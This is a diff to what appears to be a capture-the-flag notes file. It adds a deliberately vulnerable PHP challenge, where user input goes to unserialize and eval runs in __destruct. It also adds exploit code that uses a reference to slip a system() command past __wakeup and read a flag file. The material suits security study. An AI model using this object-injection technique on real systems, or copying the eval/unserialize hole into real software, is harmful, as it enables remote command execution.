@@ -1,5 +1,40 @@
 ```php
 <?php
+
+show_source(__FILE__);
+###very___so___easy!!!!
+class test{
+    public $a;
+    public $b;
+    public $c;
+    public function __wakeup(){
+        $this->a='';
+    }
+    public function __destruct(){
+        $this->b=$this->c;
+        eval($this->a);
+    }
+}
+$a=$_GET['a'];
+if(!preg_match('/test":3/i',$a)){
+    die("no");
+}
+$bbb=unserialize($_GET['a']);
+
+
+
+
+$x=new test;
+$x->b=&$x->a;
+$x->c='system("cat /fffffffffflagafag");';
+echo serialize($x);
+```
+
+
+
+
+```php
+<?php
 include "waf.php";
 class NISA{
     public $fun="show_me_flag";
